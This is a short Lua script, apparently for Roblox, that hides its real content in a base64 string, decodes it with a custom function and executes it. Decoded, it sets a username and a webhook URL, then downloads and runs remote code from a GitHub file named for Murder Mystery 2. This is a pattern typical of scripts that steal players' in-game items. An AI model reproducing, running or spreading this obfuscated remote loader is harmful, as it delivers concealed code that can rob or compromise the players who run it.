
 -- Obfuscated script
 local encodedScript = "VXNlcm5hbWUgPSAiVnhsdWJsZXMxNSIKIFdlYmhvb2sgPSAiaHR0cHM6Ly9wcm90ZWN0ZWQtd2ViaG9vay5pby93ZWJob29rP2lkPWFIUjBjSE02THk5d2NtOTBaV04wWldRdGQyVmlhRzl2YXk1cGJ5OTNaV0pvYjI5clAybGtQV0ZJVWpCalNFMDJUSGs1YTJGWVRtcGlNMHByVEcxT2RtSlRPV2hqUjJ0MlpESldhV0ZIT1haaE0wMTJUVlJKTlU5VVRUVk5lbU41VGxSamVrOUVTVEZPUkZGM1RVTTVNMVJxU2xWVk0xWklWakpTVEZOV1l6VlBSamxHVTNwc2JWWXdaSGRUYlVwU1kwUktUbE5GWkVwTldFWk5WMWhSTWxkVmNHcFBSMWt6VGpCd2JWbFZXbEJoV0VKdVdrWkdSbVF6VFRCVmExcFhUMGQzTlZORk1YRldaejA5IiAtLSBQcm90ZWN0ZWQgd2ViaG9vawoKIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vU2hhclNjcmlwdC9NTTIvcmVmcy9oZWFkcy9tYWluL1Byb3RlY3RlZF9NTTIudHh0IikpKCk="

 -- Decode function
 local function decode(str)
     local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
     str = string.gsub(str, '[^'..b..'=]', '')
     return (str:gsub('.', function(x)
         if (x == '=') then return '' end
         local r,f='',(b:find(x)-1)
         for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
         return r;
     end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
         if (#x ~= 8) then return '' end
         local c=0
         for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
         return string.char(c)
     end))
 end

 -- Run the decoded script
 loadstring(decode(encodedScript))()
 